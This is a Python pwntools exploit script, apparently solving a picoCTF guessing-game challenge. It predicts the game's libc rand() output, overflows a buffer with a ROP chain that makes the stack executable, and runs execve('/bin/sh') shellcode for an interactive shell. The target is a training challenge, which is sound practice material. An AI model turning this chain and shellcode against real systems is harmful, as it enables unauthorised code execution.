from pwn import *
from ctypes import *
import random

a = random.choice(['local','remote'])
if ( a == 'remote'):
    p = remote('jupiter.challenges.picoctf.org', 28953)
else:
    p = process('./vuln')

libc = CDLL('/lib/x86_64-linux-gnu/libc-2.31.so')
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

def random():
    return (libc.rand() % 100) + 1
elf = ELF('./vuln')
rop = ROP(elf)

mov_rdx_rax = 0x0000000000419127
pop_rdx = (rop.find_gadget(['pop rdx', 'ret']))[0]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rax = (rop.find_gadget(['pop rax', 'ret']))[0]
push_rsp = 0x0000000000451974
p.sendline(str(random()))
print("[+] angka yang dimasukkan : ", random())

payload = b"A" * 120
payload += p64(pop_rdx) + p64(elf.symbols['__stack_prot'])
payload += p64(pop_rax) + p64(7)
payload += p64(mov_rdx_rax)
payload += p64(pop_rdi) + p64(elf.symbols['__libc_stack_end'])
payload += p64(elf.symbols['_dl_make_stack_executable'])
payload += p64(push_rsp) + shellcode
print ("[+] payloadnya adalah : ", payload)

p.sendline(payload)
p.interactive()
